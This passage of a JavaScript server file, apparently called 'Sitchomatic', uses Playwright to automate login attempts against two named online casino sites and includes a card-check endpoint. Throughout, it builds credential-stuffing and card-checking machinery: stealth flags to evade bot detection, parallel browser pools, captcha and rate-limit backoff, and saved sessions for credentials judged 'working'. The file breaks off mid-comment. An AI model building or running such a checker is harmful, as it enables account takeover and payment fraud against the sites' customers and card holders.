/**
 * @fileoverview Sitchomatic Web — Real Browser Automation Server v1.3
 *
 * Express + Playwright server that performs LIVE browser automation.
 * Serves the webapp static files on port 8791 and provides a REST API
 * on the same port under /api/... for real credential and card checks.
 *
 * Each check opens a real headless Chromium browser, navigates to the
 * target site, fills the form, submits, and captures 4 real screenshots
 * of the actual browser window at each key moment.
 *
 * API endpoints:
 *   POST /api/login-check   — Joe Fortune or Ignition login attempt
 *   POST /api/card-check    — PPSR card check
 *   GET  /api/status        — Server health check
 */

import express from 'express';
import { chromium } from 'playwright';
import path from 'path';
import fs from 'fs';
import fsp from 'fs/promises';
import crypto from 'crypto';
import { fileURLToPath } from 'url';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const app = express();
app.use(express.json({ limit: '10mb' }));

// Serve the webapp static files
app.use(express.static(path.join(__dirname, 'webapp')));

// ── Disk Directories ─────────────────────────────────────────────────────────
/** Root folder for all persisted debug screenshots (PNG on disk). */
const SHOTS_DIR    = path.join(__dirname, 'debug-shots');
/** Root folder for Playwright storageState JSON per credential (for session reuse). */
const SESSIONS_DIR = path.join(__dirname, 'sessions');
/** Root folder for structured JSONL logs (one line per event). */
const LOGS_DIR     = path.join(__dirname, 'logs');
/** Root folder for per-run raw HTML snapshots (one file per screenshot slot). */
const RUNS_DIR     = path.join(__dirname, 'runs');
for (const d of [SHOTS_DIR, SESSIONS_DIR, LOGS_DIR, RUNS_DIR]) {
  try { fs.mkdirSync(d, { recursive: true }); } catch {}
}
// Serve screenshots at /shots/<runId>/<file>.png so the webapp can load them
// directly from disk rather than carrying multi-MB base64 blobs in localStorage.
app.use('/shots', express.static(SHOTS_DIR, { maxAge: '1h' }));
// Serve raw HTML artefacts at /runs/<runId>/<idx>.html for forensic debugging.
app.use('/runs',  express.static(RUNS_DIR,  { maxAge: '1h' }));

// ── Structured Logger (JSONL) ────────────────────────────────────────────────
/** Current log file path — rolls per day so a single file never gets huge. */
function _logFile() {
  const d = new Date().toISOString().slice(0, 10); // YYYY-MM-DD
  return path.join(LOGS_DIR, `events-${d}.jsonl`);
}
/**
 * Append a structured JSONL event to today's log file + echo to stdout.
 * Never throws — logging failure must never break automation.
 * @param {string} level  - One of: debug|info|warn|error
 * @param {string} event  - Short event name (e.g. 'login.start')
 * @param {object} [data] - Arbitrary structured fields
 */
function logEvent(level, event, data = {}) {
  const line = JSON.stringify({ ts: new Date().toISOString(), level, event, ...data });
  try { fs.appendFileSync(_logFile(), line + '\n'); } catch {}
  // Echo to console for live tailing during dev
  if (level === 'error')      console.error(line);
  else if (level === 'warn')  console.warn(line);
  else                        console.log(line);
}

// ── SSE Event Hub ────────────────────────────────────────────────────────────
/**
 * Server-Sent Events hub. Each connected client subscribes via GET /api/events
 * and receives a stream of JSON events pushed from runs (shot saved, run start,
 * run end, cancellation, network signal, etc.). Replaces the frontend's 15s
 * polling model — UI updates are now instant.
 */
const sseClients = new Set();
/**
 * Broadcast a structured event to every connected SSE client. Safe to call from
 * anywhere in the automation pipeline. Dropped clients (closed sockets) are
 * automatically removed.
 * @param {string} event - Event name (e.g. 'run.progress', 'shot.saved')
 * @param {object} data  - Arbitrary payload; will be JSON-stringified
 */
function broadcast(event, data) {
  const payload = `event: ${event}\ndata: ${JSON.stringify(data)}\n\n`;
  for (const res of sseClients) {
    try { res.write(payload); } catch { sseClients.delete(res); }
  }
}

app.get('/api/events', (req, res) => {
  res.writeHead(200, {
    'Content-Type':  'text/event-stream',
    'Cache-Control': 'no-cache, no-transform',
    'Connection':    'keep-alive',
    'X-Accel-Buffering': 'no',
  });
  res.write(': connected\n\n');
  sseClients.add(res);
  const ka = setInterval(() => { try { res.write(': ka\n\n'); } catch {} }, 25000);
  req.on('close', () => { clearInterval(ka); sseClients.delete(res); });
});

// ── Run Registry (cancellation + tracking) ────────────────────────────────────
/**
 * Map of runId → { controller, site, username, startedAt, page, browser }.
 * Used so POST /api/cancel/:runId can abort an in-flight automation and close
 * the underlying Playwright page/browser cleanly.
 * @type {Map<string, object>}
 */
const runRegistry = new Map();

/** Create an AbortController-backed run handle and register it. */
function startRun(meta) {
  const runId = crypto.randomUUID();
  const controller = new AbortController();
  const handle = { runId, controller, startedAt: Date.now(), ...meta };
  runRegistry.set(runId, handle);
  broadcast('run.start', { runId, ...meta, startedAt: handle.startedAt });
  logEvent('info', 'run.start', { runId, ...meta });
  return handle;
}
function endRun(handle, extra = {}) {
  if (!handle) return;
  runRegistry.delete(handle.runId);
  broadcast('run.end', { runId: handle.runId, durationMs: Date.now() - handle.startedAt, ...extra });
  logEvent('info', 'run.end', { runId: handle.runId, durationMs: Date.now() - handle.startedAt, ...extra });
}

app.post('/api/cancel/:runId', (req, res) => {
  const h = runRegistry.get(req.params.runId);
  if (!h) return res.status(404).json({ error: 'Run not found' });
  try { h.controller.abort(); } catch {}
  // Aggressively tear down the live browser for this run
  try { h.page?.close().catch(() => {}); } catch {}
  try { h.context?.close().catch(() => {}); } catch {}
  logEvent('warn', 'run.cancel', { runId: h.runId });
  broadcast('run.cancel', { runId: h.runId });
  res.json({ ok: true, runId: h.runId });
});

app.get('/api/runs', (_req, res) => {
  res.json(Array.from(runRegistry.values()).map(h => ({
    runId: h.runId, site: h.site, username: h.username, startedAt: h.startedAt,
  })));
});

// ── Per-Domain Smart Throttling ──────────────────────────────────────────────
/**
 * Per-domain throttle config. minDelayMs is the minimum wait between consecutive
 * runs hitting the same domain; jitterMs adds a random 0..jitterMs on top.
 * backoffMs is applied (and exponentially grown) whenever a run observes a 429
 * or captcha signal on that domain.
 */
const DOMAIN_THROTTLE = {
  'joefortunepokies.win': { minDelayMs: 0,    jitterMs: 400, backoffMs: 0 },
  'ignitioncasino.ooo':   { minDelayMs: 0,    jitterMs: 600, backoffMs: 0 },
  _default:               { minDelayMs: 0,    jitterMs: 200, backoffMs: 0 },
};
/** Last time each domain was hit — used to compute remaining wait. */
const _domainLastHit = new Map();

function _hostOf(url) {
  try { return new URL(url).hostname.replace(/^www\./, ''); } catch { return '_default'; }
}
function _throttleFor(host) { return DOMAIN_THROTTLE[host] || DOMAIN_THROTTLE._default; }

/**
 * Waits long enough to respect per-domain rate limits before starting a run.
 * Combines: minDelay (between consecutive hits) + jitter + active backoffMs.
 * @param {string} url - The target URL whose host will be throttled.
 */
async function applyDomainThrottle(url) {
  const host = _hostOf(url);
  const cfg  = _throttleFor(host);
  const last = _domainLastHit.get(host) || 0;
  const gap  = Date.now() - last;
  const jitter   = Math.floor(Math.random() * cfg.jitterMs);
  const waitFor  = Math.max(0, (cfg.minDelayMs + cfg.backoffMs + jitter) - gap);
  if (waitFor > 0) {
    logEvent('debug', 'throttle.wait', { host, waitFor, backoffMs: cfg.backoffMs });
    await new Promise(r => setTimeout(r, waitFor));
  }
  _domainLastHit.set(host, Date.now());
}
/**
 * Trigger exponential backoff when a domain returns 429 / shows captcha.
 * Resets on clean success.
 */
function bumpDomainBackoff(host) {
  const cfg = _throttleFor(host);
  cfg.backoffMs = Math.min(60_000, cfg.backoffMs ? cfg.backoffMs * 2 : 2_000);
  logEvent('warn', 'throttle.backoff.bump', { host, backoffMs: cfg.backoffMs });
}
function resetDomainBackoff(host) {
  const cfg = _throttleFor(host);
  if (cfg.backoffMs) logEvent('info', 'throttle.backoff.reset', { host });
  cfg.backoffMs = 0;
}

// ── Constants ────────────────────────────────────────────────────────────────

/** Port the server listens on. */
const PORT = 8791;

/**
 * Browser launch options for all automation contexts.
 * Uses Chromium headless with stealth-style args to reduce bot detection.
 */
const BROWSER_ARGS = [
  '--no-sandbox',
  '--disable-setuid-sandbox',
  '--disable-blink-features=AutomationControlled',
  '--disable-infobars',
  '--window-size=1280,800',
];

/** Default page navigation timeout in milliseconds. */
const NAV_TIMEOUT = 30000;

/** How long to wait after submitting a form before taking a screenshot. */
const POST_SUBMIT_WAIT = 3000;

// ── Concurrency Pool Config (Swarm Upgrade v1) ───────────────────────────────
/**
 * Upper bound for the headless context pool. The old build hard-serialised every
 * run behind a single Chromium process; we now fan out across N reusable
 * contexts sharing the same warm browser. Headed (liveView) mode stays single-
 * slot so the user can still watch one live window without fighting for focus.
 *
 * Tunable at runtime by POSTing { maxConcurrent: N } to /api/pool/config.
 */
const POOL_MAX_ABS = 16;
const POOL_MAX_DEFAULT = 12;
let POOL_MAX_HEADLESS = POOL_MAX_DEFAULT;
const POOL_MAX_HEADED   = 1;

// ── Persistent Browser Pool ──────────────────────────────────────────────────
/**
 * Keeps a single Chromium browser instance alive across runs. Per-run contexts
 * are created and destroyed (cheap), but the browser itself is reused — cutting
 * ~1.5s launch overhead per credential. Re-launches automatically if the browser
 * crashes or is closed. Two pools: headless and headed (liveView).
 * @type {{ headless: import('playwright').Browser | null, headed: import('playwright').Browser | null }}
 */
const browserPool = { headless: null, headed: null };
// Pending-launch coalescing: multiple concurrent callers share a single
// chromium.launch() promise per mode so we never orphan Chromium processes
// when the pool is cold and the context lease pool asks for N workers at once.
const browserLaunching = { headless: null, headed: null };

/**
 * Get (or lazy-launch) the persistent browser for the given mode.
 * Concurrent-safe: coalesces simultaneous cold-start requests into one launch.
 * @param {boolean} live - true = visible window (liveView), false = headless
 * @returns {Promise<import('playwright').Browser>}
 */
async function getBrowser(live) {
  const key = live ? 'headed' : 'headless';
  const existing = browserPool[key];
  if (existing && existing.isConnected()) return existing;

  // Another caller is already launching for this mode — join them.
  if (browserLaunching[key]) return browserLaunching[key];

  const launchArgs = live
    ? [...BROWSER_ARGS, '--window-size=540,420', '--window-position=40,40']
    : BROWSER_ARGS;
  const launchPromise = chromium.launch({
    headless: !live,
    args:     launchArgs,
    slowMo:   live ? 120 : 0,
  }).then((b) => {
    // When the browser disconnects (crash, user close), clear the slot so the
    // next request triggers a fresh launch instead of using a dead handle.
    b.on('disconnected', () => { if (browserPool[key] === b) browserPool[key] = null; });
    browserPool[key] = b;
    logEvent('info', 'browser.launched', { mode: key });
    return b;
  }).finally(() => {
    if (browserLaunching[key] === launchPromise) browserLaunching[key] = null;
  });

  browserLaunching[key] = launchPromise;
  return launchPromise;
}

/** Cleanly close both pooled browsers on process exit. */
async function shutdownBrowserPool() {
  for (const key of ['headless', 'headed']) {
    const b = browserPool[key];
    if (b) {
      try { await b.close(); } catch {}
      browserPool[key] = null;
    }
  }
}
async function _shutdownAll() {
  await drainContextPool().catch(() => {});
  await shutdownBrowserPool().catch(() => {});
}
process.once('SIGINT',  () => _shutdownAll().finally(() => process.exit(0)));
process.once('SIGTERM', () => _shutdownAll().finally(() => process.exit(0)));

// ── Context Lease Pool (Swarm Upgrade v1) ────────────────────────────────────
/**
 * Lease-based context pool: one pool per mode (headless / headed). Callers
 * acquire a context via leaseContext(), do their work, then release. Released
 * contexts are wiped (cookies cleared) and pushed back onto the idle stack for
 * the next lease to grab — avoids the ~100–200ms cost of creating a fresh
 * context every run. Bounded by POOL_MAX_* so we never exceed the user's
 * configured concurrency.
 *
 * `needsFreshState: true` (e.g. a run needs a specific storageState) forces a
 * freshly-created context that will be destroyed rather than returned.
 */
const ctxPool = {
  headless: { idle: [], waiters: [], active: 0 },
  headed:   { idle: [], waiters: [], active: 0 },
};

function _poolCapFor(mode) { return mode === 'headed' ? POOL_MAX_HEADED : POOL_MAX_HEADLESS; }

async function _newContext(browser, live) {
  return browser.newContext({
    viewport: live ? { width: 540, height: 420 } : { width: 1280, height: 800 },
    userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
    ignoreHTTPSErrors: true,
  });
}

/**
 * Acquire a context from the pool. Resolves with { context, mode, fresh } where
 * `fresh` signals the caller must apply any storageState themselves (only true
 * when `needsFreshState` was requested).
 *
 * @param {{live?:boolean, needsFreshState?:boolean, signal?:AbortSignal}} opts
 * @returns {Promise<{context: import('playwright').BrowserContext, mode: 'headless'|'headed', fresh: boolean}>}
 */
async function leaseContext({ live = false, needsFreshState = false, signal } = {}) {
  const mode = live ? 'headed' : 'headless';
  const pool = ctxPool[mode];

  // Pre-flight: bail early if already cancelled.
  if (signal?.aborted) throw new Error('lease cancelled');

  // Fresh-state requests bypass the idle stack but still count against the cap.
  if (needsFreshState) {
    await _waitForSlot(pool, mode, signal);
    const browser = await getBrowser(live);
    const context = await _newContext(browser, live);
    pool.active++;
    return { context, mode, fresh: true };
  }

  // Try idle stack first.
  if (pool.idle.length > 0) {
    const context = pool.idle.pop();
    pool.active++;
    return { context, mode, fresh: false };
  }

  // Grow pool up to cap.
  if (pool.active + pool.idle.length < _poolCapFor(mode)) {
    const browser = await getBrowser(live);
    const context = await _newContext(browser, live);
    pool.active++;
    return { context, mode, fresh: false };
  }

  // At cap — queue.
  return new Promise((resolve, reject) => {
    const waiter = { resolve, reject, signal };
    pool.waiters.push(waiter);
    if (signal) {
      signal.addEventListener('abort', () => {
        const i = pool.waiters.indexOf(waiter);
        if (i !== -1) pool.waiters.splice(i, 1);
        reject(new Error('lease cancelled'));
      }, { once: true });
    }
  });
}

async function _waitForSlot(pool, mode, signal) {
  while (pool.active + pool.idle.length >= _poolCapFor(mode)) {
    if (signal?.aborted) throw new Error('lease cancelled');
    if (pool.idle.length > 0) {
      const ctx = pool.idle.pop();
      try { await ctx.close(); } catch {}
      return; // freed one slot
    }
    await new Promise((resolve, reject) => {
      const waiter = { resolve: () => resolve(), reject, signal, _waitOnly: true };
      pool.waiters.push(waiter);
      if (signal) signal.addEventListener('abort', () => {
        const i = pool.waiters.indexOf(waiter);
        if (i !== -1) pool.waiters.splice(i, 1);
        reject(new Error('lease cancelled'));
      }, { once: true });
    });
  }
}

/**
 * Release a previously-leased context. When `destroy` is true the context is
 * closed outright (used on cancellation, error, or fresh-state runs); otherwise
 * it is wiped and returned to the idle stack for reuse.
 */
async function releaseContext(lease, { destroy = false } = {}) {
  if (!lease) return;
  const pool = ctxPool[lease.mode];
  pool.active = Math.max(0, pool.active - 1);

  const shouldDestroy = destroy || lease.fresh || !lease.context || !lease.context.browser();
  if (shouldDestroy) {
    try { await lease.context.close(); } catch {}
  } else {
    // Wipe transient state so the next caller starts clean.
    try { await lease.context.clearCookies(); } catch {}
    try { await lease.context.clearPermissions?.(); } catch {}
    // Close any lingering pages; next caller always creates its own page.
    try {
      const pages = lease.context.pages();
      await Promise.all(pages.map(p => p.close().catch(() => {})));
    } catch {}
    pool.idle.push(lease.context);
  }

  // Wake the next waiter (if any) by handing them a context. We prefer the
  // idle stack (hot reuse) but also grow the pool if slots are free.
  while (pool.waiters.length > 0) {
    const w = pool.waiters.shift();
    if (w._waitOnly) { try { w.resolve(); } catch {} return; }
    if (pool.idle.length > 0) {
      const context = pool.idle.pop();
      pool.active++;
      try { w.resolve({ context, mode: lease.mode, fresh: false }); } catch {}
      return;
    }
    // No idle context but slot free — caller asked for a fresh-ish lease;
    // just resolve — they'll create one.
    if (pool.active + pool.idle.length < _poolCapFor(lease.mode)) {
      try {
        const browser = await getBrowser(lease.mode === 'headed');
        const context = await _newContext(browser, lease.mode === 'headed');
        pool.active++;
        w.resolve({ context, mode: lease.mode, fresh: false });
      } catch (err) { w.reject(err); }
      return;
    }
  }
}

/** Drain and destroy every pooled context (called on shutdown). */
async function drainContextPool() {
  for (const mode of ['headless', 'headed']) {
    const pool = ctxPool[mode];
    const idle = pool.idle.splice(0);
    await Promise.all(idle.map(c => c.close().catch(() => {})));
    // Reject any pending waiters so they don't hang forever.
    for (const w of pool.waiters.splice(0)) {
      try { w.reject(new Error('pool draining')); } catch {}
    }
    pool.active = 0;
  }
}

// POST /api/pool/config { maxConcurrent: N }
app.post('/api/pool/config', express.json(), (req, res) => {
  const n = parseInt(req.body?.maxConcurrent, 10);
  if (!Number.isFinite(n) || n < 1 || n > POOL_MAX_ABS) {
    return res.status(400).json({ error: `maxConcurrent must be 1..${POOL_MAX_ABS}` });
  }
  POOL_MAX_HEADLESS = n;
  logEvent('info', 'pool.config', { maxConcurrent: n });
  broadcast('pool.config', { maxConcurrent: n });
  res.json({ ok: true, maxConcurrent: POOL_MAX_HEADLESS });
});

app.get('/api/pool/stats', (_req, res) => {
  res.json({
    maxConcurrent: POOL_MAX_HEADLESS,
    headless: { active: ctxPool.headless.active, idle: ctxPool.headless.idle.length, waiters: ctxPool.headless.waiters.length },
    headed:   { active: ctxPool.headed.active,   idle: ctxPool.headed.idle.length,   waiters: ctxPool.headed.waiters.length },
  });
});

// ── storageState Session Persistence ─────────────────────────────────────────
/**
 * Per-credential storageState path. Stored under sessions/<site>/<sha>.json so
 * paths stay filesystem-safe even with exotic characters in emails.
 * @param {string} site     - 'joe' | 'ign'
 * @param {string} username - Credential username/email
 */
function sessionFileFor(site, username) {
  const sha = crypto.createHash('sha1').update(`${site}:${username}`).digest('hex').slice(0, 16);
  const dir = path.join(SESSIONS_DIR, site);
  try { fs.mkdirSync(dir, { recursive: true }); } catch {}
  return path.join(dir, `${sha}.json`);
}

/**
 * Load a saved storageState JSON for the given cred, or return undefined if
 * none exists / it's unreadable. Passed to browser.newContext to restore prior
 * cookies + localStorage so repeat logins can skip the form entirely.
 */
async function loadStorageState(site, username) {
  try {
    const p = sessionFileFor(site, username);
    if (!fs.existsSync(p)) return undefined;
    const raw = await fsp.readFile(p, 'utf8');
    return JSON.parse(raw);
  } catch { return undefined; }
}

/**
 * Persist the context's storageState so future runs for the same credential
 * can reuse the authenticated session. Called only after a confirmed success.
 */
async function saveStorageState(context, site, username) {
  try {
    const p = sessionFileFor(site, username);
    await context.storageState({ path: p });
    logEvent('info', 'session.saved', { site, username, path: p });
  } catch (err) {
    logEvent('warn', 'session.save.failed', { site, username, error: err.message });
  }
}

/**
 * Delete a stored session (used when a cred becomes perm disabled etc).
 */
async function clearStoredSession(site, username) {
  try { await fsp.unlink(sessionFileFor(site, username)); } catch {}
}

// ── Disk Screenshot Helpers ──────────────────────────────────────────────────
/**
 * Saves a PNG screenshot buffer to disk under debug-shots/<runId>/ and returns
 * a metadata object { path, url }. The frontend now loads the image by URL
 * directly from /shots/<runId>/<idx>.png instead of carrying a heavy base64
 * blob in localStorage — Swarm Upgrade v1 drops the data URL entirely.
 *
 * @param {Buffer|null} buf  - Raw PNG buffer (or null on failure)
 * @param {string} runId     - Run UUID
 * @param {number} idx       - Shot index (1..4)
 * @returns {{path:string, url:string}}
 */
async function persistShotBuffer(buf, runId, idx) {
  if (!buf) return { path: '', url: '' };
  const dir = path.join(SHOTS_DIR, runId);
  try { fs.mkdirSync(dir, { recursive: true }); } catch {}
  const filename = `${idx}.png`;
  const filePath = path.join(dir, filename);
  try { await fsp.writeFile(filePath, buf); } catch (err) {
    logEvent('warn', 'shot.write.failed', { runId, idx, error: err.message });
  }
  const url = `/shots/${runId}/${filename}`;
  broadcast('shot.saved', { runId, idx, url });
  return { path: filePath, url };
}

/**
 * Capture and persist the current page's full HTML under runs/<runId>/<idx>.html
 * alongside every screenshot. The raw HTML is priceless for forensic debugging
 * when a selector change on the target site breaks automation and the screenshot
 * alone doesn't reveal what the DOM looked like.
 *
 * Never throws — HTML capture failure must never break an automation run.
 *
 * @param {import('playwright').Page} page
 * @param {string} runId
 * @param {number} idx  - Matching shot index (1..4)
 * @returns {Promise<{path:string, url:string}>}
 */
async function persistRunHtml(page, runId, idx) {
  if (!page) return { path: '', url: '' };
  const dir = path.join(RUNS_DIR, runId);
  try { fs.mkdirSync(dir, { recursive: true }); } catch {}
  const filename = `${idx}.html`;
  const filePath = path.join(dir, filename);
  try {
    const html = await page.content().catch(() => '');
    if (html) await fsp.writeFile(filePath, html);
  } catch (err) {
    logEvent('warn', 'html.write.failed', { runId, idx, error: err.message });
  }
  const url = `/runs/${runId}/${filename}`;
  return { path: filePath, url };
}

// ── Network Response Hooks ───────────────────────────────────────────────────
/**
 * Attaches response listeners to a page and returns a live snapshot object
 * that summarises observed auth-related network activity. This gives the
 * login outcome pass a robust secondary signal that doesn't depend on
 * fragile DOM heuristics.
 *
 * Tracked:
 *   - saw429:        true if any response was 429 (rate-limited → backoff)
 *   - sawCaptcha:    true if hCaptcha/reCaptcha/Cloudflare IUAM appears in any url
 *   - authSuccess:   true if a 2xx JSON response contains balance/userId/token
 *   - authFailure:   true if a response contains "invalid"/"incorrect" creds
 *   - statusCodes:   Set of all status codes seen (for log forensics)
 *
 * @param {import('playwright').Page} page
 * @returns {{saw429:boolean,sawCaptcha:boolean,authSuccess:boolean,authFailure:boolean,statusCodes:Set<number>,responses:Array}}
 */
function attachNetworkHooks(page) {
  const snap = {
    saw429:      false,
    sawCaptcha:  false,
    authSuccess: false,
    authFailure: false,
    statusCodes: new Set(),
    responses:   [],
  };
  page.on('response', async (resp) => {
    try {
      const status = resp.status();
      const url    = resp.url();
      snap.statusCodes.add(status);
      if (status === 429) snap.saw429 = true;
      if (/hcaptcha\.com|recaptcha|cloudflare.*cdn-cgi\/challenge|__cf_chl/i.test(url)) {
        snap.sawCaptcha = true;
      }
      // Only sniff bodies of likely auth endpoints to keep things cheap
      if (status >= 200 && status < 400 && /login|auth|session|signin|account/i.test(url)) {
        const ct = (resp.headers()['content-type'] || '').toLowerCase();
        if (ct.includes('application/json')) {
          const body = await resp.text().catch(() => '');
          if (body) {
            if (/"(balance|userId|user_id|accessToken|access_token|sessionToken)"/i.test(body)) snap.authSuccess = true;
            if (/"(error|invalid|incorrect|disabled|locked)"/i.test(body))                      snap.authFailure = true;
            snap.responses.push({ url, status, snippet: body.slice(0, 400) });
          }
        }
      }
    } catch { /* ignore network read errors */ }
  });
  return snap;
}

// ── Helpers ──────────────────────────────────────────────────────────────────

/**
 * Captures a viewport screenshot from a Playwright page and returns it as a
 * base64-encoded PNG data URL. Injects a "SCR X/4" badge into the top-right
 * corner of the live page before screenshotting so the label is burned into
 * the real browser image, then removes the badge afterwards.
 *
 * @param {import('playwright').Page} page - The Playwright page to capture.
 * @param {string} [label] - Optional label to burn in, e.g. 'SCR 1/4'.
 * @returns {Promise<string>} Data URL string (data:image/png;base64,...).
 */
async function captureShot(page, label) {
  const buf = await captureShotBuf(page, label);
  return buf ? `data:image/png;base64,${buf.toString('base64')}` : '';
}

/**
 * Same as captureShot but returns the raw PNG Buffer so the caller can persist
 * it to disk AND convert to dataUrl without double-encoding.
 * @param {import('playwright').Page} page
 * @param {string} [label] - badge text (e.g. 'SCR 1/4')
 * @returns {Promise<Buffer|null>}
 */
async function captureShotBuf(page, label) {
  const BADGE_ID = '_sitcho_scr_badge';
  try {
    if (label) {
      await page.evaluate(([id, text]) => {
        const existing = document.getElementById(id);
        if (existing) existing.remove();
        const el = document.createElement('div');
        el.id = id;
        el.style.cssText = [
          'position:fixed', 'top:12px', 'right:12px',
          'background:rgba(0,0,0,0.72)', 'color:#fff',
          'font-size:13px', 'font-weight:700', 'letter-spacing:0.5px',
          'padding:4px 11px', 'border-radius:6px', 'z-index:2147483647',
          'font-family:ui-monospace,monospace', 'pointer-events:none',
          'box-shadow:0 2px 8px rgba(0,0,0,0.5)',
        ].join(';');
        el.textContent = text;
        document.body.appendChild(el);
      }, [BADGE_ID, label]).catch(() => {});
    }
    const buf = await page.screenshot({ fullPage: false, type: 'png' });
    if (label) {
      await page.evaluate((id) => { document.getElementById(id)?.remove(); }, BADGE_ID).catch(() => {});
    }
    return buf;
  } catch {
    return null;
  }
}

/**
 * Attempts to fill a login form on the given page by trying a set of common
 * CSS selectors for email/username and password fields.
 * @param {import('playwright').Page} page - The Playwright page.
 * @param {string} username - Username or email to fill in.
 * @param {string} password - Password to fill in.
 * @returns {Promise<boolean>} True if both fields were found and filled.
 */
async function fillLoginForm(page, username, password) {
  // Strict visible-only selectors — no loose text-input fallback which caused
  // Ignition to target the same <input> for both email and password.
  const emailSelectors = [
    'input[type="email"]:visible',
    'input[name="email"]:visible',
    'input[name="username"]:visible',
    'input[name="login"]:visible',
    'input[placeholder*="email" i]:visible',
    'input[placeholder*="username" i]:visible',
    'input[id*="email" i]:visible',
    'input[id*="user" i]:visible',
    'input[id*="login" i]:visible',
  ];
  const passSelectors = [
    'input[type="password"]:visible',
    'input[name="password"]:visible',
    'input[name="pass"]:visible',
    'input[placeholder*="password" i]:visible',
    'input[id*="password" i]:visible',
  ];

  let emailHandle = null;
  let emailFilled = false;
  for (const sel of emailSelectors) {
    try {
      const el = page.locator(sel).first();
      if (await el.count() > 0 && await el.isVisible({ timeout: 3000 })) {
        await el.click();
        await el.fill('');
        await el.fill(username);
        emailHandle = await el.elementHandle();
        emailFilled = true;
        break;
      }
    } catch {}
  }

  // Pause — some sites enable the password field via JS handlers that fire
  // on email input/blur. Then explicitly wait for a password-typed field to
  // materialise before proceeding; avoids Ignition's type="text"→"password"
  // hydration race where the password selector collided with the email.
  if (emailFilled) {
    await page.waitForTimeout(600);
    await page.waitForSelector('input[type="password"]:visible', { timeout: 5000 }).catch(() => {});
  }

  let passFilled = false;
  for (const sel of passSelectors) {
    try {
      const el = page.locator(sel).first();
      if (await el.count() === 0) continue;
      if (!(await el.isVisible({ timeout: 3000 }).catch(() => false))) continue;

      // Guard against the password locator resolving to the SAME element as
      // the email — which would overwrite the email value with the password.
      if (emailHandle) {
        const passHandle = await el.elementHandle();
        if (passHandle && emailHandle) {
          const sameNode = await page.evaluate(([a, b]) => a === b, [emailHandle, passHandle]).catch(() => false);
          if (sameNode) continue;
        }
      }

      await el.click();
      await el.fill('');
      await el.fill(password);
      passFilled = true;
      break;
    } catch {}
  }

  // Short settle time after password entry before caller proceeds
  if (passFilled) await page.waitForTimeout(300);

  return emailFilled && passFilled;
}

/**
 * Attempts to dismiss any visible cookie consent / GDPR popup by clicking
 * common accept/dismiss buttons. Runs silently — never throws.
 *
 * Tries text-based button matches first (most reliable across sites), then
 * falls back to common class/id/attribute selectors used by popular consent
 * management platforms (OneTrust, Cookiebot, TrustArc, etc.).
 *
 * Should be called after every page.goto() and after form submissions that
 * may trigger a new page load with a fresh consent overlay.
 *
 * @param {import('playwright').Page} page - The Playwright page.
 * @returns {Promise<void>}
 */
async function dismissCookiePopup(page) {
  // Text targets — include <button>, <a>, [role=button], generic clickables.
  // Covers Joe Fortune ("Got It" / "I agree") and Ignition ("Accept" / "I Understand")
  // which render as anchor tags or divs, not real <button>s.
  const textTargets = [
    'Accept All Cookies', 'Accept all cookies',
    'Accept All', 'Accept all',
    'Accept & Continue', 'Accept and continue',
    'Accept Cookies', 'Accept cookies',
    'Accept',
    'Allow All Cookies', 'Allow all cookies',
    'Allow All', 'Allow all',
    'I Accept', 'I accept',
    'I Agree', 'I agree',
    'I Understand', 'I understand',
    'Agree & Close', 'Agree and close',
    'Agree',
    'Got it', 'Got It', 'GOT IT',
    'Yes, I Agree', 'Yes, I agree',
    'That\'s OK', 'That\'s fine',
    'OK', 'Ok',
    'Close', 'Dismiss',
    'Continue',
  ];

  const roleSelectors = textTargets.flatMap(t => [
    `button:has-text("${t}")`,
    `a:has-text("${t}")`,
    `[role="button"]:has-text("${t}")`,
    `div[role="button"]:has-text("${t}")`,
    `span[role="button"]:has-text("${t}")`,
  ]);

  const attrSelectors = [
    // OneTrust
    '#onetrust-accept-btn-handler',
    '.onetrust-close-btn-handler',
    // Cookiebot
    '#CybotCookiebotDialogBodyLevelButtonLevelOptinAllowAll',
    '#CybotCookiebotDialogBodyButtonAccept',
    // TrustArc
    '.trustarc-agree-btn',
    '.truste_popframe .pdynamicbutton',
    // Didomi
    '#didomi-notice-agree-button',
    // Generic consent platforms — buttons, anchors and role=button inside banners
    '[id*="cookie"][id*="accept" i]',
    '[id*="cookie"][id*="allow" i]',
    '[class*="cookie"][class*="accept" i]',
    '[class*="cookie-consent"] button',
    '[class*="cookie-consent"] a',
    '[class*="cookie-banner"] button',
    '[class*="cookie-banner"] a',
    '[class*="cookie-notice"] button',
    '[class*="cookie-notice"] a',
    '[class*="gdpr"] button',
    '[class*="consent"] button',
    '[aria-label*="accept" i][role="button"]',
    '[aria-label*="accept cookies" i]',
    '[data-testid*="cookie-accept" i]',
    '[data-testid*="consent-accept" i]',
  ];

  const tryOnce = async () => {
    for (const sel of [...roleSelectors, ...attrSelectors]) {
      try {
        const el = page.locator(sel).first();
        if (await el.count() > 0 && await el.isVisible({ timeout: 250 }).catch(() => false)) {
          await el.click({ timeout: 1200, force: false }).catch(async () => {
            // Fallback: JS click in case the element is covered
            await el.evaluate(n => n.click()).catch(() => {});
          });
          return true;
        }
      } catch {}
    }
    return false;
  };

  // First pass
  if (await tryOnce()) {
    await page.waitForTimeout(400).catch(() => {});
    return;
  }
  // Some banners mount after a short delay — retry after 1.2s
  await page.waitForTimeout(1200).catch(() => {});
  await tryOnce();
}

/**
 * Clicks the login/submit button on a login form by trying common selectors.
 * @param {import('playwright').Page} page - The Playwright page.
 * @returns {Promise<boolean>} True if a submit button was found and clicked.
 */
async function clickSubmit(page) {
  const submitSelectors = [
    'button[type="submit"]',
    'input[type="submit"]',
    'button:has-text("Log in")',
    'button:has-text("Login")',
    'button:has-text("Sign in")',
    'button:has-text("Sign In")',
    'button:has-text("Submit")',
    '[data-testid*="submit" i]',
    '[data-testid*="login" i]',
    '.login-btn',
    '.btn-login',
    '.submit-btn',
  ];
  for (const sel of submitSelectors) {
    try {
      const el = page.locator(sel).first();
      if (await el.count() > 0 && await el.isVisible()) {
        await el.click();
        return true;
      }
    } catch {}
  }
  return false;
}

/**
 * Analyses the page content after a login attempt to determine the outcome.
 *
 * Strategy (strict — avoids false positives from Cloudflare/anti-bot redirects):
 *  1. Check for hard failure text first (disabled, locked, invalid creds).
 *  2. Only call "working" when MULTIPLE strong success signals are present
 *     (URL path change to account area AND success body text), or when a
 *     high-confidence success keyword appears in the page text.
 *  3. A bare URL redirect is NOT sufficient for "working" — casino sites
